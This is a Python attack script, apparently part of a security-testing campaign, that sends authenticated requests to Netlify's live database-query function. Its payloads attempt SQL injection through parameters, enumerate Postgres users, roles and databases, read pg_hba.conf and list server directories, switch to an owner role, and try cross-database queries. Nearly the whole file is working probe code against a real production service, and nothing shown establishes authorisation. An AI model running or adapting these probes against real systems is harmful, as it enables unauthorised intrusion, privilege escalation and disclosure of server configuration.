# -*- coding: utf-8 -*-
"""database-query 变异第四轮:params 注入/系统信息/扩展与跨库能力"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A

SITE_A = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()

def req(body):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=30)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_A,
         'Content-Type': 'application/json'}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

def q(sql, params=None):
    return {'siteId': SITE_A, 'action': 'query', 'sql': sql, **({'params': params} if params is not None else {})}

def tx(queries):
    return {'siteId': SITE_A, 'action': 'transaction', 'queries': queries}

def show(label, body, trunc=300):
    try:
        s, raw = req(body)
        print('%-44s %d %s' % (label, s, raw[:trunc].decode('utf-8', 'ignore').replace('\n', ' ')))
    except Exception as e:
        print('%-44s ERR %s' % (label, str(e)[:60]))

# 注:query action 是否也支持 params?先试
show('query w/ params',        q('select $1', ['z']))
# D1. params 类型混淆/注入
show('tx param quote inject',  tx([{'sql': 'select $1', 'params': ["x') union select 2--"]}]))
show('tx param backslash',     tx([{'sql': 'select $1', 'params': ["x\\'; select 2--"]}]))
show('tx param int as sql',    tx([{'sql': 'select $1', 'params': [{'a': 1}]}]))
show('tx param null',          tx([{'sql': 'select $1', 'params': [None]}]))
show('tx param bool',          tx([{'sql': 'select $1', 'params': [True]}]))
show('tx param float',         tx([{'sql': 'select $1', 'params': [1.5]}]))
show('tx param missing $1',    tx([{'sql': 'select $1', 'params': []}]))
show('tx param extra',         tx([{'sql': 'select $1', 'params': ['a', 'b']}]))
show('tx param $2 only',       tx([{'sql': 'select $1,$2', 'params': ['a']}]))
show('tx param bigstr',        tx([{'sql': 'select length($1)', 'params': ['A' * 5000]}]))
# D2. 系统信息收集
show('query users',            q('select usename, usesysid from pg_user order by 1 limit 20')),
show('query roles',            q('select rolname, rolsuper, rolcreaterole, rolcanlogin from pg_roles order by 1 limit 20')),
show('query databases',        q('select datname from pg_database order by 1')),
show('query extensions',       q('select extname, extversion from pg_extension order by 1')),
show('query fdw',              q('select srvname, srvoptions from pg_foreign_server')),
show('query settings leak',    q("select name, setting from pg_settings where name in ('server_version','data_directory','log_directory','port','unix_socket_directories')")),
show('query pg_read_file',     q("select pg_read_file('pg_hba.conf')")),
show('query pg_ls_dir',        q("select pg_ls_dir('')")),
show('query current_user',     q('select current_user, session_user, current_database(), inet_server_addr(), inet_server_port()')),
show('query table privs',      q('select grantee, privilege_type from information_schema.role_table_grants where grantee not like %s' % "'pg%' limit 10")),
# D3. SET/会话控制
show('tx set search_path',     tx([{'sql': 'set search_path=public'}, {'sql': 'show search_path'}])),
show('tx set role',            tx([{'sql': 'set role netlifydb_owner'}, {'sql': 'select current_user'}])),
show('tx set app',             tx([{'sql': "set application_name='x'"}, {'sql': 'show application_name'}])),
# D4. 跨库查询尝试
show('tx cross-db',            tx([{'sql': 'select count(*) from postgres.pg_class'}, {'sql': 'select 1'}])),
